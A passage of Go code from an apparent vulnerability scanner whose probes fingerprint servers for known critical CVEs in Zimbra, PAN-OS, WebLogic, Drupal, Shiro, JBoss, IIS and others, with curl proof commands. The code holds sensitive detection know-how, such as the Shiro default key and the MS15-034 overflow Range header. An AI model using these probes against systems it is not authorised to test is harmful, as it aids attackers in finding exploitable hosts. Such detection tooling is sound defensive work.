		Title:    fmt.Sprintf("CVE-2022-22965 (Spring4Shell): Spring MVC classLoader binding detected on %s", asset),
		Description: "The server responded to a Spring MVC classLoader binding probe with a data-binding error " +
			"consistent with an unpatched Spring Framework. CVE-2022-22965 (CVSS 9.8, KEV) exploits the " +
			"class.module.classLoader.URLs parameter chain on Spring MVC running on JDK 9+ with a WAR deployment, " +
			"allowing unauthenticated remote code execution via logging configuration overwrite and JSP drop. " +
			"Upgrade to Spring Framework 5.3.18+ / 5.2.20+ and restrict classLoader data binding.",
		Evidence: map[string]any{
			"probe_url":   u,
			"status_code": resp.StatusCode,
			"body_snip":   string(b)[:min(len(b), 256)],
		},
		ProofCommand: fmt.Sprintf(
			"curl -s -o /dev/null -w '%%{http_code}' '%s'\n"+
				"# Expected: 400 with Spring classLoader binding error in body",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeZimbraAuthBypass tests for CVE-2022-37042 (Zimbra Collaboration auth bypass → RCE, CVSS 9.8, KEV).
// The mboximport servlet endpoint is supposed to require authentication; on unpatched Zimbra versions
// a parameter confusion flaw allows the auth check to be bypassed. A GET returning HTTP 500 (rather
// than 401/403) indicates the servlet is reachable without credentials, confirming the bypass.
func probeZimbraAuthBypass(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/service/extension/backup/mboximport"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible; BeaconScanner/1.0)")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	// 401 or 403 means auth is enforced — not vulnerable.
	if resp.StatusCode == http.StatusUnauthorized || resp.StatusCode == http.StatusForbidden {
		return nil
	}
	// We need to reach the servlet (500 = processing error after auth bypass, 200 also possible).
	if resp.StatusCode != http.StatusInternalServerError && resp.StatusCode != http.StatusOK {
		return nil
	}
	bodyLower := strings.ToLower(string(b))
	// Require Zimbra-specific content to avoid false positives from other servers.
	if !strings.Contains(bodyLower, "zimbra") && !strings.Contains(bodyLower, "mboximport") &&
		!strings.Contains(bodyLower, "zcs") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEZimbraAuthBypass,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Asset:    asset,
		Title:    fmt.Sprintf("CVE-2022-37042: Zimbra mboximport endpoint reachable without authentication on %s", asset),
		Description: "The Zimbra mboximport backup servlet (/service/extension/backup/mboximport) returned a " +
			"non-auth response (HTTP 500/200), indicating the authentication bypass is present. " +
			"CVE-2022-37042 (CVSS 9.8, KEV) allows an unauthenticated attacker to upload and execute arbitrary JSP " +
			"code via the mboximport endpoint, leading to full server compromise. This was exploited as a zero-day " +
			"and observed delivering webshells and cryptocurrency miners. " +
			"Apply Zimbra security patches 9.0.0 P27 / 8.8.15 P34 or later immediately.",
		Evidence: map[string]any{
			"endpoint":    u,
			"status_code": resp.StatusCode,
		},
		ProofCommand: fmt.Sprintf(
			"curl -s -o /dev/null -w '%%{http_code}' '%s'\n"+
				"# Expected: 500 (not 401/403) — confirms mboximport reachable without authentication",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probePulseSecureVPN fingerprints Pulse Secure VPN appliances via the welcome page.
// CVE-2019-11510 (CVSS 10.0, KEV) allows unauthenticated arbitrary file read via path traversal
// through the guacamole HTML5 VPN component. The file-read probe reads /etc/passwd — Deep only.
// Surface mode emits a finding on fingerprint alone: exposed Pulse Secure is always a risk signal.
func probePulseSecureVPN(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/dana-na/auth/url_default/welcome.cgi"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bLower := strings.ToLower(string(b))
	if !strings.Contains(bLower, "pulse") && !strings.Contains(bLower, "ivanti connect") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEPulseSecureVPN,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Asset:    asset,
		Title:    fmt.Sprintf("CVE-2019-11510: Pulse Secure VPN internet-exposed on %s", asset),
		Description: "A Pulse Secure (Ivanti Connect Secure) SSL VPN appliance is internet-accessible. " +
			"CVE-2019-11510 (CVSS 10.0, KEV) is a pre-authentication arbitrary file read via path traversal " +
			"through the guacamole HTML5 VPN endpoint, allowing unauthenticated attackers to read " +
			"/data/runtime/mtmp/lmdb/rand_data/data.mdb which contains session tokens and cached credentials. " +
			"NSA and CISA documented APT actors using this to steal AD credentials at scale. " +
			"Affected: PCS 8.1R1–8.3R7, 9.0R1–9.0R3.3. Patch immediately and rotate all credentials.",
		Evidence: map[string]any{
			"url": u,
		},
		ProofCommand: fmt.Sprintf(
			"curl -sI '%s' | head -5\n"+
				"# Expected: HTTP 200 with Pulse Secure login — confirms VPN appliance exposed",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probePANGlobalProtect checks for PAN-OS GlobalProtect VPN prelogin exposure.
// The prelogin endpoint returns XML with the PAN-OS version, enabling detection of:
//   - CVE-2019-1579 (CVSS 9.8, KEV): pre-auth buffer overflow in PAN-OS < 7.1.19/8.0.12/8.1.3
//   - CVE-2024-3400 (CVSS 10.0, KEV): OS command injection in PAN-OS 10.2/11.0/11.1 with
//     GlobalProtect enabled; actively exploited by nation-state actor UTA0178
func probePANGlobalProtect(ctx context.Context, client *http.Client, base, asset string) []finding.Finding {
	u := base + "/global-protect/prelogin.esp"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	body := string(b)
	bLower := strings.ToLower(body)
	if !strings.Contains(bLower, "globalprotect") && !strings.Contains(bLower, "panos") &&
		!strings.Contains(bLower, "prelogin-response") {
		return nil
	}
	// Extract PAN-OS version from <panos-version> element if present.
	ver := ""
	if idx := strings.Index(body, "<panos-version>"); idx != -1 {
		end := strings.Index(body[idx:], "</panos-version>")
		if end != -1 {
			ver = body[idx+len("<panos-version>") : idx+end]
		}
	}
	ev := map[string]any{"prelogin_url": u}
	if ver != "" {
		ev["panos_version"] = ver
	}
	proofCmd := fmt.Sprintf("curl -s '%s' | grep -i 'panos-version\\|globalprotect'", u)

	var findings []finding.Finding

	// CVE-2024-3400: OS command injection via GlobalProtect cookie (CVSS 10.0, KEV).
	// Affects PAN-OS 10.2.0–10.2.8, 11.0.0–11.0.3, 11.1.0–11.1.2 when GlobalProtect
	// is enabled. Actively exploited by UTA0178 (nation-state) before patch availability.
	if ver != "" && isPANOSCMDInjectionVulnerable(ver) {
		findings = append(findings, finding.Finding{
			CheckID:  finding.CheckCVEPANGlobalProtectCMD,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Asset:    asset,
			Title:    fmt.Sprintf("CVE-2024-3400: PAN-OS %s vulnerable to unauthenticated OS command injection", ver),
			Description: fmt.Sprintf(
				"PAN-OS %s is internet-accessible and vulnerable to CVE-2024-3400 (CVSS 10.0, KEV). "+
					"An unauthenticated attacker can execute arbitrary OS commands as root on the firewall "+
					"via a crafted GlobalProtect session cookie. Affected: PAN-OS 10.2.0–10.2.8, 11.0.0–11.0.3, "+
					"and 11.1.0–11.1.2 with GlobalProtect gateway or portal enabled. "+
					"This vulnerability was actively exploited by nation-state actor UTA0178 before patching. "+
					"Upgrade to PAN-OS 10.2.9+, 11.0.4+, or 11.1.3+ immediately.",
				ver,
			),
			Evidence:     ev,
			ProofCommand: proofCmd,
			DiscoveredAt: time.Now(),
		})
	}

	// CVE-2019-1579: pre-auth buffer overflow in GlobalProtect prelogin handler.
	// Affects PAN-OS < 7.1.19, < 8.0.12, < 8.1.3.
	title2019 := fmt.Sprintf("CVE-2019-1579: PAN-OS GlobalProtect portal exposed on %s", asset)
	if ver != "" {
		title2019 = fmt.Sprintf("CVE-2019-1579: PAN-OS %s GlobalProtect portal exposed on %s", ver, asset)
	}
	findings = append(findings, finding.Finding{
		CheckID:  finding.CheckCVEPANGlobalProtect,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Asset:    asset,
		Title:    title2019,
		Description: "A Palo Alto Networks GlobalProtect VPN portal or gateway is internet-accessible. " +
			"CVE-2019-1579 (CVSS 9.8, KEV) is a pre-authentication buffer overflow in the GlobalProtect " +
			"prelogin handler affecting PAN-OS < 7.1.19, < 8.0.12, < 8.1.3. " +
			"An unauthenticated attacker can achieve remote code execution on the VPN appliance. " +
			"Patch to the fixed versions and consider restricting the portal to known source IPs.",
		Evidence:     ev,
		ProofCommand: proofCmd,
		DiscoveredAt: time.Now(),
	})

	return findings
}

// isPANOSCMDInjectionVulnerable returns true when the PAN-OS version string is in
// the range affected by CVE-2024-3400 (OS command injection via GlobalProtect cookie):
//   - 10.2.0 – 10.2.8  (patched: 10.2.9)
//   - 11.0.0 – 11.0.3  (patched: 11.0.4)
//   - 11.1.0 – 11.1.2  (patched: 11.1.3)
func isPANOSCMDInjectionVulnerable(ver string) bool {
	parts := strings.Split(ver, ".")
	if len(parts) < 2 {
		return false
	}
	maj, min, patch := 0, 0, 0
	fmt.Sscanf(parts[0], "%d", &maj)
	fmt.Sscanf(parts[1], "%d", &min)
	if len(parts) >= 3 {
		fmt.Sscanf(parts[2], "%d", &patch)
	}
	switch {
	case maj == 10 && min == 2:
		return patch <= 8
	case maj == 11 && min == 0:
		return patch <= 3
	case maj == 11 && min == 1:
		return patch <= 2
	default:
		return false
	}
}

// probeCrowdPdkInstall checks for the Atlassian Crowd pdkinstall plugin endpoint.
// CVE-2019-11580 (CVSS 9.8, KEV) — the pdkinstall development plugin was never disabled
// in production Crowd builds. A GET returning 200 with file upload form means unauthenticated
// plugin installation (and thus arbitrary code execution) is possible.
func probeCrowdPdkInstall(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/crowd/plugins/servlet/pdkinstall"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bLower := strings.ToLower(string(b))
	// The page contains a file upload form with "file_cdn" input or plugin install instructions.
	if !strings.Contains(bLower, "crowd") && !strings.Contains(bLower, "plugin") &&
		!strings.Contains(bLower, "upload") && !strings.Contains(bLower, "atlassian") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVECrowdPdkInstall,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Asset:    asset,
		Title:    fmt.Sprintf("CVE-2019-11580: Atlassian Crowd pdkinstall endpoint exposed on %s", asset),
		Description: "The Atlassian Crowd pdkinstall plugin installation endpoint is internet-accessible " +
			"without authentication. CVE-2019-11580 (CVSS 9.8, KEV) allows any unauthenticated attacker " +
			"to POST a malicious JAR plugin to /crowd/plugins/servlet/pdkinstall, causing arbitrary Java " +
			"code execution on the Crowd server. Affected: Crowd 2.1.0–3.4.3. " +
			"Upgrade immediately and restrict the admin interface to management networks.",
		Evidence: map[string]any{"pdkinstall_url": u},
		ProofCommand: fmt.Sprintf(
			"curl -sI '%s'\n"+
				"# Expected: HTTP 200 — confirms unauthenticated plugin install endpoint exposed",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeTelerikRAU checks for the Telerik RadAsyncUpload endpoint.
// CVE-2019-18935 (CVSS 9.8, KEV) allows unauthenticated .NET deserialization RCE when
// the Telerik encryption key is known or default. The endpoint itself is detectable via a
// safe GET — any HTTP 200/400/500 response with Telerik-specific content confirms presence.
func probeTelerikRAU(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/Telerik.Web.UI.WebResource.axd?type=rau"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	// Any non-404 response with Telerik-specific content confirms the endpoint.
	if resp.StatusCode == http.StatusNotFound {
		return nil
	}
	bLower := strings.ToLower(string(b))
	if !strings.Contains(bLower, "telerik") && !strings.Contains(bLower, "radupload") &&
		!strings.Contains(bLower, "fileinfo") && !strings.Contains(bLower, "raupostback") {
		// Also check for 200 with empty JSON body (some versions return {"fileInfo":{}})
		if resp.StatusCode != http.StatusOK || !strings.Contains(string(b), "{") {
			return nil
		}
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVETelerikRAU,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Asset:    asset,
		Title:    fmt.Sprintf("CVE-2019-18935: Telerik RadAsyncUpload endpoint exposed on %s", asset),
		Description: "The Telerik RadAsyncUpload handler (Telerik.Web.UI.WebResource.axd?type=rau) is " +
			"internet-accessible. CVE-2019-18935 (CVSS 9.8, KEV) allows unauthenticated .NET deserialization " +
			"RCE when the Telerik encryption key is known or default. Prior CVEs (2017-11317, 2017-11357) " +
			"exposed encryption keys that are reused across installations. CISA KEV-listed and exploited " +
			"by multiple APT groups. Upgrade Telerik UI to R1 2020 SP1 (2020.1.114) or later.",
		Evidence: map[string]any{
			"rau_url":     u,
			"status_code": resp.StatusCode,
		},
		ProofCommand: fmt.Sprintf(
			"curl -sI '%s'\n"+
				"# Expected: HTTP 200/400/500 with Telerik content — confirms RAU endpoint exposed",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeWebLogicAsync checks for Oracle WebLogic /_async/ endpoint exposure.
// CVE-2019-2725 (CVSS 9.8, KEV) is a pre-authentication Java deserialization RCE via the
// AsyncResponseService SOAP endpoint. A WSDL GET is safe and definitively confirms the endpoint.
func probeWebLogicAsync(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/_async/AsyncResponseService?WSDL"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bLower := strings.ToLower(string(b))
	if !strings.Contains(bLower, "asyncresponseservice") && !strings.Contains(bLower, "bea.com") &&
		!strings.Contains(bLower, "weblogic") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEWebLogicAsync,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Asset:    asset,
		Title:    fmt.Sprintf("CVE-2019-2725: Oracle WebLogic /_async/ endpoint exposed on %s", asset),
		Description: "The Oracle WebLogic AsyncResponseService endpoint (/_async/AsyncResponseService) is " +
			"internet-accessible and returned its WSDL. CVE-2019-2725 (CVSS 9.8, KEV) exploits Java " +
			"deserialization in this endpoint using an XMLDecoder gadget chain — no authentication required. " +
			"Also related: CVE-2019-2729 (wls-wsat endpoint, same mechanism). " +
			"Affected: WebLogic 10.3.6, 12.1.3, 12.2.1.3, 12.2.1.4. " +
			"Apply the April 2019 Oracle CPU immediately and remove /_async/ and /wls-wsat/ if unused.",
		Evidence: map[string]any{"async_wsdl_url": u},
		ProofCommand: fmt.Sprintf(
			"curl -s '%s' | grep -i 'asyncresponseservice\\|bea.com'\n"+
				"# Expected: WSDL XML with WebLogic namespace — confirms pre-auth deserialization endpoint exposed",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeDrupalgeddon checks Drupal version via CHANGELOG.txt for Drupalgeddon2/3 (CVE-2018-7600/7602).
// CHANGELOG.txt is present on all default Drupal installations and lists the exact release version.
// Drupal 8.x < 8.5.1 and 7.x < 7.58 are vulnerable to Drupalgeddon2 (CVSS 9.8, KEV).
// Drupal 7.x < 7.59 and 8.x < 8.5.3 are also vulnerable to Drupalgeddon3 (CVE-2018-7602).
func probeDrupalgeddon(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	// Drupal 8.x uses /core/CHANGELOG.txt; Drupal 7.x uses /CHANGELOG.txt.
	for _, path := range []string{"/core/CHANGELOG.txt", "/CHANGELOG.txt"} {
		u := base + path
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
		if err != nil {
			continue
		}
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
		resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			continue
		}
		body := string(b)
		if !strings.Contains(strings.ToLower(body), "drupal") {
			continue
		}
		// Extract version from first line: "Drupal 8.4.5, 2018-02-21"
		ver := parseDrupalVersion(body)
		if ver == "" {
			continue
		}
		vuln, cve := isDrupalVulnerable(ver)
		if !vuln {
			return nil
		}
		return &finding.Finding{
			CheckID:  finding.CheckCVEDrupalgeddon2,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Asset:    asset,
			Title:    fmt.Sprintf("%s: Drupal %s vulnerable to Drupalgeddon on %s", cve, ver, asset),
			Description: fmt.Sprintf(
				"Drupal %s is internet-accessible and vulnerable to %s (Drupalgeddon2/3, CVSS 9.8, KEV). "+
					"Drupalgeddon2 (CVE-2018-7600) is a pre-authentication remote code execution vulnerability "+
					"in Drupal's Form API that allows arbitrary PHP execution. Within hours of disclosure, "+
					"automated exploit kits began mass-scanning and backdooring vulnerable sites. "+
					"Drupalgeddon3 (CVE-2018-7602) is a related authenticated RCE. "+
					"Upgrade Drupal 8.x to ≥ 8.5.1 or Drupal 7.x to ≥ 7.58 immediately.",
				ver, cve,
			),
			Evidence: map[string]any{
				"drupal_version": ver,
				"changelog_url":  u,
			},
			ProofCommand: fmt.Sprintf(
				"curl -s '%s' | head -5\n"+
					"# Expected: Drupal %s release notes — confirms vulnerable version installed",
				u, ver),
			DiscoveredAt: time.Now(),
		}
	}
	return nil
}

// parseDrupalVersion extracts the Drupal version number from CHANGELOG.txt content.
// The first non-empty line is typically "Drupal X.Y.Z, YYYY-MM-DD".
func parseDrupalVersion(changelog string) string {
	for _, line := range strings.Split(changelog, "\n") {
		line = strings.TrimSpace(line)
		if line == "" {
			continue
		}
		// Format: "Drupal 8.4.5, 2018-02-21"
		if strings.HasPrefix(strings.ToLower(line), "drupal ") {
			parts := strings.Fields(line)
			if len(parts) >= 2 {
				return strings.TrimRight(parts[1], ",")
			}
		}
		return "" // First non-empty line is not a version line
	}
	return ""
}

// isDrupalVulnerable checks whether the Drupal version is vulnerable to Drupalgeddon2/3.
// Returns (vulnerable bool, primary CVE string).
func isDrupalVulnerable(ver string) (bool, string) {
	parts := strings.Split(ver, ".")
	if len(parts) < 2 {
		return false, ""
	}
	var major, minor, patch int
	fmt.Sscanf(parts[0], "%d", &major)
	fmt.Sscanf(parts[1], "%d", &minor)
	if len(parts) >= 3 {
		fmt.Sscanf(parts[2], "%d", &patch)
	}
	switch major {
	case 8:
		// Drupalgeddon2: < 8.5.1; also 8.3.x/8.4.x need backport patches
		if minor < 5 || (minor == 5 && patch < 1) {
			return true, "CVE-2018-7600"
		}
	case 7:
		// Drupalgeddon2: < 7.58
		if minor < 58 {
			return true, "CVE-2018-7600"
		}
	}
	return false, ""
}

// probeWebLogicWLSWSAT checks for Oracle WebLogic /wls-wsat/ endpoint exposure.
// CVE-2017-10271 (CVSS 9.8, KEV) — the WLS-WSAT CoordinatorPortType endpoint processes
// arbitrary XML that gets deserialized before authentication, allowing XMLDecoder-based RCE.
func probeWebLogicWLSWSAT(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/wls-wsat/CoordinatorPortType"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bLower := strings.ToLower(string(b))
	if !strings.Contains(bLower, "weblogic") && !strings.Contains(bLower, "wsat") &&
		!strings.Contains(bLower, "coordinator") && !strings.Contains(bLower, "bea.com") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEWebLogicWLSWSAT,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Asset:    asset,
		Title:    fmt.Sprintf("CVE-2017-10271: Oracle WebLogic /wls-wsat/ endpoint exposed on %s", asset),
		Description: "The Oracle WebLogic WLS-WSAT (Web Services Atomic Transactions) endpoint at " +
			"/wls-wsat/CoordinatorPortType is internet-accessible. CVE-2017-10271 (CVSS 9.8, KEV) exploits " +
			"XML deserialization via an XMLDecoder gadget chain in this endpoint — no authentication required. " +
			"Also related: CVE-2017-3506, CVE-2019-2725 (/_async/ endpoint, same mechanism). " +
			"Mass-exploited within days of disclosure for cryptomining and backdoor deployment. " +
			"Apply the October 2017 Oracle CPU and disable WLS-WSAT if unused.",
		Evidence: map[string]any{"wlswsat_url": u},
		ProofCommand: fmt.Sprintf(
			"curl -s '%s' | grep -i 'weblogic\\|wsat\\|bea.com'\n"+
				"# Expected: WLS WSAT service response — confirms pre-auth deserialization endpoint exposed",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeHikvisionISAPI checks for unauthenticated Hikvision IP camera ISAPI access.
// CVE-2017-7921 (CVSS 9.8, KEV) — Hikvision cameras have broken authentication on the ISAPI
// management interface, allowing unauthenticated access to camera controls and credentials.
func probeHikvisionISAPI(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/ISAPI/Security/sessionLogin/capabilities"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 4096))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	bLower := strings.ToLower(string(b))
	if !strings.Contains(bLower, "sessionlogin") && !strings.Contains(bLower, "isapi") &&
		!strings.Contains(bLower, "hikvision") && !strings.Contains(bLower, "challenge") {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEHikvisionISAPI,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Asset:    asset,
		Title:    fmt.Sprintf("CVE-2017-7921: Hikvision IP camera ISAPI accessible on %s", asset),
		Description: "A Hikvision IP camera ISAPI management interface is internet-accessible without " +
			"authentication. CVE-2017-7921 (CVSS 9.8, KEV) is an authentication bypass in Hikvision " +
			"cameras that allows unauthenticated retrieval of device information, credentials, and " +
			"camera configuration, and can enable full camera control. " +
			"CISA issued advisories in 2021 and 2022 as Hikvision cameras were actively exploited " +
			"for botnet recruitment and network lateral movement. " +
			"Update firmware to the latest version and restrict ISAPI access to management networks.",
		Evidence: map[string]any{"isapi_url": u},
		ProofCommand: fmt.Sprintf(
			"curl -s '%s'\n"+
				"# Expected: XML with sessionLogin capabilities — confirms unauthenticated ISAPI access",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeShiroRememberMe detects Apache Shiro installations via the rememberMe=deleteMe oracle.
// CVE-2016-4437 (CVSS 9.8, KEV) — Shiro's remember-me cookie deserializes untrusted data using
// a hard-coded default key (kPH+bIxk5D2deZiIxcaaaA==). If the server sets rememberMe=deleteMe
// in response to a garbage cookie value, Shiro attempted to decrypt/deserialize it — this is the
// detection signal. The probe is a single GET request and is entirely non-destructive.
func probeShiroRememberMe(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, base+"/", nil)
	if err != nil {
		return nil
	}
	// Set a garbage rememberMe cookie — if Shiro processes it and fails, it sets deleteMe.
	req.Header.Set("Cookie", "rememberMe=beacon-probe-shiro-1234567890abcdef")
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	resp.Body.Close()
	// Check all Set-Cookie headers for rememberMe=deleteMe.
	for _, cookie := range resp.Cookies() {
		if strings.EqualFold(cookie.Name, "rememberMe") && cookie.Value == "deleteMe" {
			return &finding.Finding{
				CheckID:  finding.CheckCVEShiroRememberMe,
				Module:   "surface",
				Scanner:  scannerName,
				Severity: finding.SeverityCritical,
				Asset:    asset,
				Title:    fmt.Sprintf("CVE-2016-4437: Apache Shiro remember-me deserialization on %s", asset),
				Description: "Apache Shiro is detected via the rememberMe=deleteMe oracle. " +
					"CVE-2016-4437 (CVSS 9.8, KEV) — Shiro deserializes the rememberMe cookie using AES with " +
					"a hard-coded default key (kPH+bIxk5D2deZiIxcaaaA==). An attacker who knows the key " +
					"(public for default configs) can encrypt a Java deserialization payload and achieve " +
					"unauthenticated RCE as the web application user. Even with a custom key, Shiro < 1.2.5 " +
					"is vulnerable if the key can be leaked. Upgrade to Shiro ≥ 1.2.5, set a strong random " +
					"cipherKey, and consider migrating to a stateless authentication model.",
				Evidence: map[string]any{
					"url":               base + "/",
					"shiro_cookie_name": "rememberMe",
					"shiro_oracle":      "Set-Cookie: rememberMe=deleteMe",
				},
				ProofCommand: fmt.Sprintf(
					"curl -sI -H 'Cookie: rememberMe=garbage' '%s/' | grep -i 'set-cookie.*rememberme'\n"+
						"# Expected: Set-Cookie: rememberMe=deleteMe — confirms Apache Shiro with cookie deserialization",
					base),
				DiscoveredAt: time.Now(),
			}
		}
	}
	return nil
}

// probeJBossJMXInvoker checks for the JBoss JMXInvokerServlet pre-auth deserialization endpoint.
// CVE-2015-7501 (CVSS 9.8, KEV) — JBoss 4.x/5.x/6.x exposes /invoker/JMXInvokerServlet which
// processes Java serialized objects before authentication. A GET returning 200 with a Java-serialized
// binary response body (magic bytes 0xACED) confirms the endpoint is accessible and vulnerable.
func probeJBossJMXInvoker(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	u := base + "/invoker/JMXInvokerServlet"
	req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
	if err != nil {
		return nil
	}
	resp, err := client.Do(req)
	if err != nil {
		return nil
	}
	b, _ := io.ReadAll(io.LimitReader(resp.Body, 512))
	resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return nil
	}
	// Java serialized object starts with magic bytes 0xACED 0x0005 (STREAM_MAGIC + STREAM_VERSION).
	if len(b) < 2 || b[0] != 0xAC || b[1] != 0xED {
		return nil
	}
	return &finding.Finding{
		CheckID:  finding.CheckCVEJBossJMXInvoker,
		Module:   "surface",
		Scanner:  scannerName,
		Severity: finding.SeverityCritical,
		Asset:    asset,
		Title:    fmt.Sprintf("CVE-2015-7501: JBoss JMXInvokerServlet pre-auth deserialization on %s", asset),
		Description: "The JBoss JMXInvokerServlet at /invoker/JMXInvokerServlet is internet-accessible and " +
			"returned a Java-serialized binary response (magic bytes 0xACED). " +
			"CVE-2015-7501 (CVSS 9.8, KEV) — this endpoint processes Java serialized objects before any " +
			"authentication check, allowing unauthenticated RCE via known gadget chains (CommonsCollections1-7, etc.). " +
			"JBoss 4.x, 5.x, and 6.x are affected; JBoss EAP versions through 6.4 require patching. " +
			"Disable or restrict /invoker/* endpoints immediately and upgrade to a supported JBoss version.",
		Evidence: map[string]any{
			"invoker_url":   u,
			"java_magic":    "0xACED (Java serialized object)",
		},
		ProofCommand: fmt.Sprintf(
			"curl -s '%s' | xxd | head -2\n"+
				"# Expected: ac ed 00 05 ... — Java serialized object confirms pre-auth deserialization endpoint",
			u),
		DiscoveredAt: time.Now(),
	}
}

// probeIISHTTPSysRange detects CVE-2015-1635 (MS15-034) — IIS HTTP.sys Range header integer
// overflow leading to denial-of-service or (in theory) RCE. The probe sends an HTTP GET request
// with a Range header whose end byte is UINT64_MAX (18446744073709551615). On vulnerable IIS
// (HTTP.sys), the server parses the range through the overflow-vulnerable code path and returns
// 416 Requested Range Not Satisfiable. Patched IIS rejects the malformed overflowed range with
// 400 Bad Request. The Server: Microsoft-IIS header confirms the target is IIS.
//
// This probe is detection-only — it does not send additional requests or trigger the overflow path
// that causes a BSOD. The 416 response indicates the vulnerable code path was entered but the
// range check (not the memory operation) is what terminates the request.
func probeIISHTTPSysRange(ctx context.Context, client *http.Client, base, asset string) *finding.Finding {
	for _, scheme := range []string{"https", "http"} {
		u := scheme + "://" + asset + "/"
		req, err := http.NewRequestWithContext(ctx, http.MethodGet, u, nil)
		if err != nil {
			continue
		}
		// UINT64_MAX = 18446744073709551615. This overflows when IIS HTTP.sys computes
		// the range size (end - start + 1), triggering the vulnerable code path.
		req.Header.Set("Range", "bytes=6000-18446744073709551615")
		resp, err := client.Do(req)
		if err != nil {
			continue
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		server := strings.ToLower(resp.Header.Get("Server"))
		if !strings.Contains(server, "microsoft-iis") {
			continue
		}
		// Patched IIS returns 400 for the invalid overflowed range.
		// Vulnerable IIS enters the overflow path and returns 416.
		if resp.StatusCode != http.StatusRequestedRangeNotSatisfiable {
			continue
		}
		return &finding.Finding{
			CheckID:  finding.CheckCVEIISHTTPSys,
			Module:   "surface",
			Scanner:  scannerName,
			Severity: finding.SeverityCritical,
			Asset:    asset,
			Title:    fmt.Sprintf("CVE-2015-1635 (MS15-034): IIS HTTP.sys Range header integer overflow on %s", asset),
